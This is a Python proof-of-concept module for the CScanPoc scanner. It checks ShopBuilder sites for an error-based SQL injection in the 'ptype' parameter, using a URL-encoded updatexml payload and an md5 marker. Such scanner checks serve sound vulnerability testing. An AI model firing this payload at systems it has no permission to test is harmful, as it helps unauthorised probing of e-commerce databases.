# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ShopBuilder_0101'  # 平台漏洞编号，留空
    name = 'ShopBuilder /?m=product&s=list&ptype SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-30'  # 漏洞公布时间
    desc = '''
        ShopBuilder是专为大中型企业开发的专业级电子商务商城系统，功能强大，安全便捷，可承载千万级访问量，让企业低成本快速构建在线商城，开启电子商务业务，系统开源发售，可以根据公司业务需要，制定专门的业务流程和各种功能模块，已成为众多大中型企业做电商会选的产品。
        ?m=product&s=list&ptype=0一处SQL注入。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=080770'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopBuilder'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '47d97819-2f8c-4bba-b8b7-375906080526'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            payload = ("/?m=product&s=list&ptype=0%27%20and%201%3Dupdatexml%281%2Cconcat%280x5c%2Cmd5"
                       "%28222222%29%29%2C1%29%23")
            verify_url = url + payload
            content = requests.get(verify_url).text
            if 'e3ceb5881a0a1fdaad01296d7554868d' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
